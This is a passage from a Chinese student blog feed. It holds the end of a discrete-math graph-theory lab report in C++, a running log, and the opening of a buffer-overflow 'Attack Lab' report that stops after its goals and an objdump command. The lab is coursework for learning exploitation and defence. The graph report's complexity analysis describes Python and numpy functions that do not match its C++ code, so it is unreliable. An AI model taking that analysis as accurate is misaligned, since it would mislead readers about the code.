class="line">        <span class="type">int</span> n = <span class="number">1</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; t;</span><br><span class="line">        <span class="keyword">while</span> (n &lt; x.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; m;</span><br><span class="line">            m.<span class="built_in">assign</span>(guanlian[<span class="number">0</span>].<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">            m[x[n - <span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">            m[x[n]] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; guanlian.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (guanlian[i] == m) &#123;</span><br><span class="line">                    t.<span class="built_in">push_back</span>(i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            n++;</span><br><span class="line">        &#125;</span><br><span class="line">        result.<span class="built_in">push_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">liantong</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; matrix)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">bool</span>&gt; visited;</span><br><span class="line">    visited.<span class="built_in">assign</span>(matrix.<span class="built_in">size</span>(), <span class="literal">false</span>);</span><br><span class="line">    visited[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; matrix.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[now][i] == <span class="number">1</span> &amp;&amp; !visited[i]) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(i);</span><br><span class="line">                visited[i] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: visited) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!x) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;</span><br><span class="line"><span class="built_in">geji</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; xianglin, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; guanlian, vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; bian) &#123;</span><br><span class="line">    vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; xian;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; guanlian.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">count</span>(bian.<span class="built_in">begin</span>(), bian.<span class="built_in">end</span>(), i)) &#123;</span><br><span class="line">            xian.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: bian) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">t</span>(xianglin.<span class="built_in">begin</span>(), xianglin.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; e;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; guanlian[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (guanlian[x][i] == <span class="number">1</span>) &#123;</span><br><span class="line">                e.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        t[e[<span class="number">0</span>]][e[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">        t[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; edge;</span><br><span class="line">        edge.<span class="built_in">push_back</span>(x);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> y: xian) &#123;</span><br><span class="line">            <span class="comment">// 添加一条弦</span></span><br><span class="line">            e.<span class="built_in">clear</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; guanlian[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (guanlian[y][i] == <span class="number">1</span>) &#123;</span><br><span class="line">                    e.<span class="built_in">push_back</span>(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            t[e[<span class="number">0</span>]][e[<span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">            t[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">liantong</span>(t)) &#123;</span><br><span class="line">                edge.<span class="built_in">push_back</span>(y);</span><br><span class="line">                t[e[<span class="number">0</span>]][e[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">                t[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result.<span class="built_in">push_back</span>(edge);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">space</span>(<span class="type">const</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;circles) &#123;</span><br><span class="line">    vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; selected;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">1</span> &lt;&lt; circles.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        selected.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> x = i, place = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x &amp; <span class="number">0x1</span>) &#123;</span><br><span class="line">                selected.<span class="built_in">push_back</span>(place);</span><br><span class="line">            &#125;</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            place++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">t</span><span class="params">(circles[selected[<span class="number">0</span>]].begin(), circles[selected[<span class="number">0</span>]].end())</span></span>;</span><br><span class="line">        selected.<span class="built_in">erase</span>(selected.<span class="built_in">begin</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> e: selected) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> each: circles[e]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">count</span>(t.<span class="built_in">begin</span>(), t.<span class="built_in">end</span>(), each)) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">auto</span> it = t.<span class="built_in">begin</span>(); it != t.<span class="built_in">end</span>();) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (*it == each) &#123;</span><br><span class="line">                            it = t.<span class="built_in">erase</span>(it);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            it++;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    t.<span class="built_in">push_back</span>(each);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result.<span class="built_in">push_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, t;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入点的个数:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入矩阵&quot;</span> &lt;&lt; endl;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            cin &gt;&gt; t;</span><br><span class="line">            temp.<span class="built_in">push_back</span>(t);</span><br><span class="line">        &#125;</span><br><span class="line">        m.<span class="built_in">push_back</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; g = <span class="built_in">guanlianMatrix</span>(m);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;关联矩阵为：&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; g.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; g[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;v&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;j: g) &#123;</span><br><span class="line">            cout &lt;&lt; j[i] &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;共有&quot;</span> &lt;&lt; <span class="built_in">treeNum</span>(m) &lt;&lt; <span class="string">&quot;颗树&quot;</span> &lt;&lt; endl;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; xianglin, guanlian;</span><br><span class="line">    vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; bian;</span><br><span class="line">    <span class="built_in">tree</span>(g, xianglin, guanlian, bian);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;生成树的相邻矩阵为：&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; xianglin.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;v&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; xianglin[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;v&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;j: xianglin) &#123;</span><br><span class="line">            cout &lt;&lt; j[i] &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;生成树关联矩阵为：&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: bian) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; guanlian[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;v&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;j: guanlian) &#123;</span><br><span class="line">            cout &lt;&lt; j[i] &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;基本回路系统为：&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;&#123; &quot;</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; circle = <span class="built_in">loop</span>(xianglin, g, bian);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; circle.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; circle[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; circle[i][j];</span><br><span class="line">            <span class="keyword">if</span> (j == circle[<span class="number">0</span>].<span class="built_in">size</span>() - <span class="number">1</span> &amp;&amp; i != circle.<span class="built_in">size</span>() - <span class="number">1</span>) cout &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; &#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; huanlu = <span class="built_in">space</span>(circle);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;环路空间为：&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;&#123; Φ ,&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; huanlu.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; huanlu[<span class="number">0</span>].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; huanlu[i][j];</span><br><span class="line">            <span class="keyword">if</span> (j == huanlu[<span class="number">0</span>].<span class="built_in">size</span>() - <span class="number">1</span> &amp;&amp; i != huanlu.<span class="built_in">size</span>() - <span class="number">1</span>) cout &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; &#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;基本割集系统为：&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;&#123; &quot;</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; gj = <span class="built_in">geji</span>(xianglin, g, bian);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; gj.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#123; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; gj[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == gj[i].<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; gj[i][j] &lt;&lt; <span class="string">&quot; &#125; &quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (i != gj.<span class="built_in">size</span>() - <span class="number">1</span>) cout &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; gj[i][j] &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; &#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;断集空间为：&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;&#123; Φ ,&quot;</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dj = <span class="built_in">space</span>(gj);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dj.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#123; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dj[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == dj[i].<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; dj[i][j] &lt;&lt; <span class="string">&quot; &#125; &quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (i != dj.<span class="built_in">size</span>() - <span class="number">1</span>) cout &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;e&quot;</span> &lt;&lt; dj[i][j] &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; &#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4、调试分析"><a href="#4、调试分析" class="headerlink" title="4、调试分析"></a>4、调试分析</h3><ul>
<li><p>（1）调试过程中所遇到的问题及解决方法：</p>
<ul>
<li><p>部分环路空间输出不全</p>
<p>解决方法：暂未解决</p>
</li>
<li><p>未熟练掌握BFS</p>
<p>解决方法：通过网上的素材借鉴理解学习</p>
</li>
</ul>
</li>
<li><p>（2）算法的时空分析：</p>
<ul>
<li><ol>
<li><p>Incidence_matrix函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(n^3)，其中 n 为相邻矩阵的边数。主要由三层循环嵌套引起，其中第一和第二层的长度均为 n，第三层的长度最坏为 n。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n^2)，由于需要存储生成的关联矩阵。</li>
</ul>
</li>
<li><p>tree函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(n^4)，主要由两层嵌套循环引起。内部循环中包含对 numpy 的 det 操作，其时间复杂度为 O(n^3)。</li>
<li>O(n^2)，由于需要存储生成的关联矩阵。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>除了输入数组外，仅使用了常量级别的额外空间，因此空间复杂性为 O(1)。</li>
</ul>
</li>
<li><p>tree_number函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(n^3)，由于需要计算 numpy 的 det 操作。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n^2)，由于需要存储生成的关联矩阵。</li>
</ul>
</li>
<li><p>Node类</p>
<p>时间复杂性：</p>
<ul>
<li>构造函数为 O(1)。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(1)。</li>
</ul>
</li>
<li><p>BFS_loop函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(n^2)，由于广度优先搜索中的两层嵌套循环。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n)，存储节点和队列。</li>
</ul>
</li>
<li><p>Basic_loop_system函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(n^4)，包含两层嵌套循环。内部循环中包含对 BFS_loop 函数的调用，其时间复杂度为 O(n^2)。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n^2)，存储回路点和回路边。</li>
</ul>
</li>
<li><p>Connected函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(n^2)，由于广度优先搜索中的两层嵌套循环。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n)，存储访问标记和队列。</li>
</ul>
</li>
<li><p>Basic_cutset_system函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(n^4)，包含两层嵌套循环。内部循环中包含对 Connected 函数的调用，其时间复杂度为 O(n^2)。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n^2)，存储割集边。</li>
</ul>
</li>
<li><p>space函数</p>
<p>时间复杂性：</p>
<ul>
<li>O(2^n * m)，其中 n 为回路的数量，m 为回路平均长度。由于使用了组合生成函数，会生成指数级的组合情况。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(2^n * m)，存储生成的环路空间。</li>
</ul>
</li>
<li><p>整体而言：</p>
<ul>
<li>这个程序的复杂度主要受到生成树和回路系统的计算部分的影响。由于广度优先搜索和组合生成函数的使用，一些函数的时间复杂度可能较高，特别是在处理大规模图的情况下。因此，在实际应用中，可能需要进一步优化算法或采用更高效的数据结构和算法。</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li><p>实际性能可能会受到不同输入情况的影响。</p>
</li>
</ul>
<h2 id="（五）实验结果"><a href="#（五）实验结果" class="headerlink" title="（五）实验结果"></a>（五）实验结果</h2><p><img src="/img/discrete/2/3.png" alt="img"></p>
<p><img src="/img/discrete/2/4.png" alt="img"></p>
<h2 id="（六）实验总结"><a href="#（六）实验总结" class="headerlink" title="（六）实验总结"></a>（六）实验总结</h2><ul>
<li><p>实验过程中的感悟和体会：</p>
<ol>
<li><p>理解图论概念：</p>
<p>在编写程序之前，我花了一些时间深入理解了图论的基本概念，包括关联矩阵、生成树、回路等。这为编写相应的算法提供了基础。</p>
</li>
<li><p>算法设计思路：</p>
<p>实现图论算法需要清晰的思路和设计。我通过分析问题，将整个流程拆分成多个函数，每个函数负责一个具体的功能。这种模块化的设计使得代码更清晰、易读且易于维护。</p>
</li>
<li><p>广度优先搜索：</p>
<p>在实现基本回路系统和基本割集系统时，我使用了广度优先搜索算法。这个算法对于遍历图的特定部分非常有效，对于实现问题的解决方案提供了重要的帮助。</p>
</li>
<li><p>异常处理的重要性：</p>
<p>在实现生成树和相关计算时，我充分利用了 numpy 库提供的矩阵操作功能。这使得矩阵计算更为简便，加速了程序的执行。</p>
</li>
</ol>
</li>
<li><p>经验和教训：</p>
<ol>
<li><p>函数模块化设计：</p>
<p>在设计程序时，将大问题拆分成小的、相对独立的函数是一个良好的实践。这样不仅提高了代码的可读性，而且降低了出错的可能性。</p>
</li>
<li><p>异常处理：</p>
<p>在用户输入部分，我没有添加足够的异常处理机制。在实际应用中，用户可能输入不符合要求的数据，因此要保证程序能够健壮地处理各种输入情况。</p>
</li>
<li><p>代码注释：</p>
<p>在一些复杂的算法部分，我添加了注释来解释代码的逻辑和功能。这对于其他人阅读和理解代码非常有帮助，也有助于自己在未来回顾代码时更容易理解。</p>
</li>
<li><p>优化思考：</p>
<p>部分算法的时间复杂度可能较高，特别是当图较大时。在实际应用中，可能需要考虑进一步的优化策略，例如改进算法或者使用更高效的数据结构。</p>
</li>
</ol>
</li>
<li><p>总结：</p>
<p>通过这次实验，我不仅学到了图论算法的实现方法，还提高了对算法设计和代码优化的认识。编写图论算法需要对问题有深入的理解，而模块化的设计和代码注释是确保代码质量的关键。</p>
<p>在未来的工作中，我将更注重对算法复杂度的优化，并且在程序中添加更多的异常处理机制，以提高程序的稳定性。此外，我还计划进一步学习和掌握图论领域的其他算法，以便更好地解决更复杂的问题。这次实验为我打开了图论算法领域的大门，为我的学术和职业发展提供了有益的经验。</p>
</li>
</ul>
<p>参考文献：<a href="https://www.imbai.cn/posts/30181.html">离散数学II实验二 ： 白</a></p>
]]></content>
      <categories>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>实验报告</tag>
        <tag>离散数学</tag>
        <tag>离散</tag>
        <tag>Python</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>跑步记录</title>
    <url>/posts/run.html</url>
    <content><![CDATA[<blockquote>
<p>没记录就是没跑，不是没更新（</p>
</blockquote>
<h2 id="2023-04-21-17-48-Fri"><a href="#2023-04-21-17-48-Fri" class="headerlink" title="2023-04-21 17:48 Fri"></a><center>2023-04-21 17:48 Fri</center></h2><div style="display: flex;">
  <div style="flex: 1;"></div>
  <div style="flex: 1;">
    <img src="/img/run/1.jpg">
  </div>
  <div style="flex: 1;"></div>
</div>

<h2 id="2023-04-26-18-05-Wed"><a href="#2023-04-26-18-05-Wed" class="headerlink" title="2023-04-26 18:05 Wed"></a><center>2023-04-26 18:05 Wed</center></h2><div style="display: flex;">
  <div style="flex: 1;"></div>
  <div style="flex: 1;">
    <img src="/img/run/2.jpg">
  </div>
  <div style="flex: 1;"></div>
</div>

<h2 id="2023-05-06-17-57-Sat"><a href="#2023-05-06-17-57-Sat" class="headerlink" title="2023-05-06 17:57 Sat"></a><center>2023-05-06 17:57 Sat</center></h2><div style="display: flex;">
  <div style="flex: 1;"></div>
  <div style="flex: 1;">
    <img src="/img/run/3.jpg">
  </div>
  <div style="flex: 1;"></div>
</div>
]]></content>
      <categories>
        <category>生活记录</category>
      </categories>
      <tags>
        <tag>记录</tag>
        <tag>跑步</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机系统基础-Attack Lab 实验报告</title>
    <url>/posts/attacklab.html</url>
    <content><![CDATA[<h1 id="中国海洋大学-计算机科学与技术系"><a href="#中国海洋大学-计算机科学与技术系" class="headerlink" title="**中国海洋大学 计算机科学与技术系**"></a><center>**中国海洋大学 计算机科学与技术系**</center></h1><h2 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a><center>实验报告</center></h2><blockquote>
<p><strong>姓名</strong>：火</p>
<p><strong>年级</strong>：2022</p>
<p><strong>专业</strong>：</p>
<p><strong>科目</strong>：计算机系统原理</p>
<p><strong>题目</strong>：Attack Lab</p>
<p><strong>实验时间</strong>：2023/12/22</p>
<p><strong>实验成绩</strong>：</p>
<p><strong>实验教师</strong>：</p>
</blockquote>
<h2 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h2><p>本次实验涉及到具有安全漏洞的两个函数<code>ctarget</code>和<code>rtarget</code>，总共包括 5 关。通过本实验你将学习到：</p>
<ul>
<li>当程序不能很好地防止缓冲区溢出时，攻击者可以利用安全漏洞的不同方式</li>
<li>更好地了解如何编写更安全的程序，以及编译器和操作系统提供的一些功能，以使程序不易受到攻击</li>
<li>更深入地了解 x86-64 机器代码的堆栈和参数传递机制</li>
<li>更深入地了解 x86-64 指令的编码方式</li>
<li>获得更多使用 GDB 和 OBJDUMP 等调试工具的经验</li>
</ul>
<h2 id="二、实验要求："><a href="#二、实验要求：" class="headerlink" title="二、实验要求："></a>二、实验要求：</h2><ul>
<li><p>在攻击字符串中供<code>ret</code>使用的任何地址只能是以下地址：</p>
<ul>
<li>函数<code>touch1</code>、<code>touch2</code>和<code>touch3</code>的地址</li>
<li>注入的代码的地址</li>
<li><code>farm.c</code>中<code>gadget</code>的地址</li>
</ul>
</li>
<li><p>只能使用<code>ret</code>指令控制程序执行流，不能使用<code>jmp</code>、<code>call</code>等指令</p>
</li>
</ul>
<h2 id="三、实验内容："><a href="#三、实验内容：" class="headerlink" title="三、实验内容："></a>三、实验内容：</h2><h3 id="·-准备工作："><a href="#·-准备工作：" class="headerlink" title="· 准备工作："></a>· 准备工作：</h3><p>先将<code>ctarget</code>代码反汇编</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; c.txt</span><br></pre></td></tr></table></figure>
